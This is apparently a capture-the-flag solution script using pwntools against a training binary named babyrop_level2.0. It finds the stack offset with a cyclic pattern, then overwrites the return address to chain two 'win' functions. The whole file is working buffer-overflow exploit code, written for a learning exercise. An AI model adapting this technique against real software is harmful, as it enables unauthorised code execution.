#!usr/bin/python3
from pwn import *

# Retrieve the ELF information from the binary and run it
elf = ELF("/challenge/babyrop_level2.0")
io = elf.process(setuid=False)

# Build and send the payload to the program
# NOTE: cyclic function setup a pattern payload that with
#       cyclic_find can be used to retrieve the distance
#       between buffer and return address
io.sendline(cyclic(512, n=8))
io.wait()
buffer_length = cyclic_find(io.corefile.fault_addr, n=8)

# Run program another time
io = elf.process()

# Build and send the payload to the program
# NOTE: elf.symbols.win_stage_1 and elf.symbols.win_stage_2 returns the address
#       of the win_stage_1 and win_stage_2 function respectively
PAYLOAD = b'A'*buffer_length + p64(elf.symbols.win_stage_1) + p64(elf.symbols.win_stage_2)
io.sendline(PAYLOAD)

# Print the output of the program
print(io.recvall().decode(errors='ignore'))